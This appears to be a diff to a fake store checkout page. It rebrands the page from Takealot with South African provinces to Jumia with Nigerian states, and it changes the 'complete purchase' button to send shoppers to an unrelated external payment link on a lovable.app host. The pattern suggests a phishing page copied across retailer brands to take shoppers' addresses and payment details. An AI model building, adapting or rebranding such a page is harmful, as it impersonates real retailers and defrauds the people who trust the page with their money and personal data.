@@ -68,10 +68,10 @@
       flex: 1;
       height: 44px;
       border-radius: 8px;
-      border: 2px solid #1a73e8;
-      background: #eaf3ff;
+      border: 2px solid #f68b1e;
+      background: #fff8f0;
       font-weight: 700;
-      color: #1a73e8;
+      color: #f68b1e;
     }
 
     .field {
@@ -100,7 +100,7 @@
       height: 48px;
       border-radius: 999px;
       border: none;
-      background: #0b6ecb;
+      background: #f68b1e;
       color: white;
       font-size: 16px;
       font-weight: 800;
@@ -130,7 +130,7 @@
       height: 50px;
       border-radius: 999px;
       border: none;
-      background: #00a651;
+      background: #f68b1e;
       color: white;
       font-size: 16px;
       font-weight: 900;
@@ -190,8 +190,16 @@
 <body>
 
   <!-- TOPBAR COM LOGO -->
+  <style>
+    .jumia-badge {
+      font-weight: 800;
+      color: #f68b1e;
+      font-size: 20px;
+      letter-spacing: -0.5px;
+    }
+  </style>
   <div class="topbar">
-    <img src="logo-takealot.svg" alt="takealot.com" class="logo-img">
+    <span class="jumia-badge">JUMIA</span>
   </div>
 
   <div class="checkout">
@@ -210,8 +218,8 @@
     <div class="field"><label>City / Town</label><input id="fCity"></div>
 
     <div class="field">
-      <label>Province</label>
-      <input id="provinceInput" placeholder="Select" readonly>
+      <label>State</label>
+      <input id="provinceInput" placeholder="Select State" readonly>
     </div>
 
     <div class="field"><label>Postal Code</label><input id="fPostal"></div>
@@ -264,19 +272,22 @@
 
   </div>
 
-  <!-- Province Modal -->
+  <!-- State Modal -->
   <div class="province-modal" id="provinceModal">
     <div class="province-sheet">
-      <div class="province-head">Province</div>
-      <div class="province-item">Eastern Cape</div>
-      <div class="province-item">Free State</div>
-      <div class="province-item">Gauteng</div>
-      <div class="province-item">KwaZulu-Natal</div>
-      <div class="province-item">Limpopo</div>
-      <div class="province-item">Mpumalanga</div>
-      <div class="province-item">Northern Cape</div>
-      <div class="province-item">North West</div>
-      <div class="province-item">Western Cape</div>
+      <div class="province-head">State</div>
+      <div class="province-item">Lagos</div>
+      <div class="province-item">Abuja (FCT)</div>
+      <div class="province-item">Kano</div>
+      <div class="province-item">Rivers</div>
+      <div class="province-item">Oyo</div>
+      <div class="province-item">Delta</div>
+      <div class="province-item">Kaduna</div>
+      <div class="province-item">Ogun</div>
+      <div class="province-item">Edo</div>
+      <div class="province-item">Enugu</div>
+      <div class="province-item">Anambra</div>
+      <div class="province-item">Akwa Ibom</div>
     </div>
   </div>
 
@@ -338,7 +349,7 @@
       }, 3000);
     }
     completePurchase.onclick = () => {
-      window.location.href = "https://app.quorapay.online/pay/9028feee-b8d0-4d8d-b610-6e8dec2df9ce";
+      window.location.href = "https://connect-debit-easy.lovable.app/pay/6bbd2031-0034-4d2f-a7fd-1c1b3567f42f";
     };
   </script>
 
